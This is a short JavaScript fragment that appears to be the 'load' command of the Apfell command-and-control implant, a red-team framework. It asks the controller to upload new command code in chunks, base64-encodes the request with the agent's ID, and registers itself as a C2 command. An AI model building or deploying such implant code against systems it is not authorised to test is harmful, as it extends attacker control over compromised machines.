load = function(task) {
    // TODO: load
    let args = JSON.parse(task.parameters);
    let response = {'action':'upload','full_path':'', 'chunk_size':1024000, 'chunk_num':1,'file_id':args.file_id};
    let encodedResponse = JSON.stringify(response);
    let final = apfell.apfellid + encodedResponse;
    let msg = btoa(unescape(encodeURIComponent(final)));
    out.push(msg);
    loads.push({'type':'load','name': args.cmds,'file_id':args.file_id, 'task_id':task.id,'data':[]});
};

C2.commands[load.name] = load;
COMMAND_ENDS_HERE